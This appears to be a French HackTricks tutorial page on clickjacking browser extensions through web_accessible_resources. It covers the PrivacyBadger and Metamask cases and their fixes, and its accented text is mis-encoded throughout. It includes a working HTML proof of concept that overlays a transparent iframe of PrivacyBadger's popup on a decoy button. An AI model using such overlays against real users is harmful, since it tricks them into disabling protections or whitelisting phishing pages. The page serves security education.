# BrowExt - ClickJacking

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Cette page va exploiter une vuln√©rabilit√© ClickJacking dans une extension de navigateur.\
Si vous ne savez pas ce qu'est le ClickJacking, consultez :

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Les extensions contiennent le fichier **`manifest.json`** et ce fichier JSON a un champ `web_accessible_resources`. Voici ce que [les documents Chrome](https://developer.chrome.com/extensions/manifest/web_accessible_resources) disent √† ce sujet :

> Ces ressources seraient alors disponibles dans une page web via l'URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, qui peut √™tre g√©n√©r√©e avec la m√©thode **`extension.getURL`**. Les ressources de la liste blanche sont servies avec les en-t√™tes CORS appropri√©s, de sorte qu'elles sont disponibles via des m√©canismes comme XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

En plus d'√™tre accessibles sur le web, les ressources dans le **`web_accessible_resources`** fonctionnent avec l'autorit√© ambiante de l'extension : elles peuvent modifier l'√©tat, charger d'autres ressources et modifier le navigateur de certaines mani√®res. Si un document dans `web_accessible_resources` peut effectuer un comportement int√©ressant, un attaquant peut l'int√©grer dans une page web et tromper les visiteurs pour qu'ils le d√©clenchent.

## Exemple de PrivacyBadger

Il a √©t√© d√©couvert que dans l'extension PrivacyBadger, le contenu du r√©pertoire `skin/` √©tait des `web_accessible_resources` :
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
En chargeant `skin/popup.html`, le document qui est rendu lorsque vous cliquez sur l'ic√¥ne PrivacyBadger dans le navigateur, **dans une iframe nous pourrions tromper l'utilisateur en cliquant sur "D√©sactiver PrivacyBadger pour ce site Web"**, exposant ainsi l'utilisateur √† un suivi suppl√©mentaire et compromettant la fonction de PrivacyBadger. **V√©rifiez l'exemple de vid√©o ClickJacking dans** [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm)

La correction √©tait simple : **retirer `/skin/*` des `web_accessible_resources`**.

### PoC
```html
<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Exemple Metamask

Un [**article de blog sur un ClickJacking dans Metamask peut √™tre trouv√© ici**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Dans ce cas, Metamask a corrig√© la vuln√©rabilit√© en v√©rifiant que le protocole utilis√© pour y acc√©der √©tait **`https:`** ou **`http:`** (et non **`chrome:`** par exemple) :

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Un autre ClickJacking corrig√©** dans l'extension Metamask √©tait que les utilisateurs pouvaient **Cliquer pour ajouter √† la liste blanche** lorsqu'une page √©tait suspecte d'√™tre du phishing √† cause de `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Comme cette page √©tait vuln√©rable au Clickjacking, un attaquant pouvait en abuser en affichant quelque chose de normal pour faire cliquer la victime pour l'ajouter √† la liste blanche sans s'en rendre compte, puis revenir √† la page de phishing qui serait alors ajout√©e √† la liste blanche.

## Exemple Steam Inventory Helper

Consultez la page suivante pour v√©rifier comment un **XSS** dans une extension de navigateur a √©t√© combin√© avec une vuln√©rabilit√© de **ClickJacking** :

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
